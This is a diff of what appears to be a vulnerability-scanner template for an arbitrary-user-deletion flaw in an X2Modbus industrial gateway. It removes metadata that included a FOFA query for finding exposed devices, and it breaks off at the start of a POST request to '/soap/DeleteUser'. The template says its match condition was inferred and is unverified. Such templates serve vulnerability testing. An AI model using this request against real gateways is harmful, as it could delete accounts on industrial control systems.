@@ -3,14 +3,8 @@ info:
   name: 上海迅饶自动化科技有限公司X2Modbus网关任意用户删除漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/4cbc97ac489cbadee627e9b61c226198
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 4cbc97ac489cbadee627e9b61c226198
-    fofa: + fofa`server="SunFull-Webs" || icon_hash="-1384370370"`
 http:
 - raw:
   - 'POST /soap/DeleteUser HTTP/1.1
